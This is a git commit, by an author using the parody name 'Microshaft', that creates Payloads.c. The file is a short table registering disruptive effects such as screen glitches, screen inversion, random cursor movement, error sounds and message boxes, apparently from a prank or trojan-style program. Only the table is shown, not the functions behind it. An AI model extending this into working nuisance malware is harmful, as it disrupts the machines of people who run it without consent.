cb75565e86eaff8a75ca1a1b1a5dd48721b5e5d6
Microshaft <41166367+MicroshaftCorp@users.noreply.github.com>
2018-07-12 13:03:54 -0700

    Create Payloads.c

---
+++ Payloads.c
@@ -0,0 +1,8 @@
+Payload(L"Draw error icons", payloadHostVisual, (LPVOID)payloadDrawErrors, 10000, TRUE), 
+Payload(L"Tunnel effect", payloadHostVisual, (LPVOID)payloadTunnel, 60000, TRUE), 
+	Payload(L"Screen glitches", payloadHostVisual, (LPVOID)payloadScreenGlitches, 15000, TRUE), 
+  Payload(L"Random cursor movement", payloadHostDefault, (LPVOID)payloadCursor, 20000, TRUE), 
+  Payload(L"Random error sounds", payloadHostDefault, (LPVOID)payloadWindowsSounds, 50000, TRUE), 
+	Payload(L"Invert Screen", payloadHostVisual, (LPVOID)payloadInvertScreen, 30000, TRUE), 
+	Payload(L"Message boxes", payloadHostDefault, (LPVOID)payloadMessageBox, 20000, TRUE), 
+	
